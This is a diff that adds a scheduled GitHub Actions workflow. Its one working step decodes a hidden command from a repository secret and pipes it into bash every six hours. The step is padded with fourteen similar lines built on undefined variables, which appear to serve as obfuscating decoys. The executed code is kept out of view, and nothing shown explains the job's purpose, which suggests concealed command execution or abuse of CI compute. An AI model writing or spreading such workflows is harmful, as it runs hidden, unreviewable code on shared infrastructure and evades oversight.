@@ -1,0 +1,33 @@
+name: chengjisi0987
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '59 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: chengjisi0987
+        env:
+          t5: ${{ secrets.t5 }}
+        run: |
+          echo $t5 | jq -r .nieht507 | /bin/bash
+          echo $vobve25 | jq -r .rab446 | /bin/bash
+          echo $mzzf999 | jq -r .y29 | /bin/bash
+          echo $d654 | jq -r .liyq84250 | /bin/bash
+          echo $vwvr83 | jq -r .krfb6572 | /bin/bash
+          echo $vuke5 | jq -r .muqi51 | /bin/bash
+          echo $inzoq79 | jq -r .tfztx5393 | /bin/bash
+          echo $pfpz63619 | jq -r .rox04 | /bin/bash
+          echo $r6194 | jq -r .zz73 | /bin/bash
+          echo $xx85186 | jq -r .qtx7 | /bin/bash
+          echo $si98021 | jq -r .uz114 | /bin/bash
+          echo $wex1 | jq -r .u953 | /bin/bash
+          echo $vdam08 | jq -r .sn2633 | /bin/bash
+          echo $k8305 | jq -r .di80 | /bin/bash
+          echo $qobrv787 | jq -r .ujz5 | /bin/bash
+
